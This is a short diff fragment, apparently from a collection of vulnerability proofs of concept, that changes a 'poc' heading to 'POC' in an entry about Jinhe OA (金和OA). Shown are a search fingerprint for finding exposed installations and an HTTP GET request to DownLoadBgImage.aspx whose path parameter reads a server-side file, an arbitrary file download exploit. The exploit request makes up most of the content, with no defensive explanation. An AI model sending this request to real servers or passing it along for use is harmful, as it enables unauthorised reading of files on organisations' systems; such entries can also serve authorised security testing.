@@ -8,7 +8,7 @@
 body="JHSoft.Web.AddMenu" || app="金和网络-金和OA"
 ```
 
-## poc
+## POC
 
 ```
 GET /C6/JHSoft.Web.AddMenu/LoginTemplate/DownLoadBgImage.aspx/?path=/C6/js/PasswordNew.js HTTP/1.1
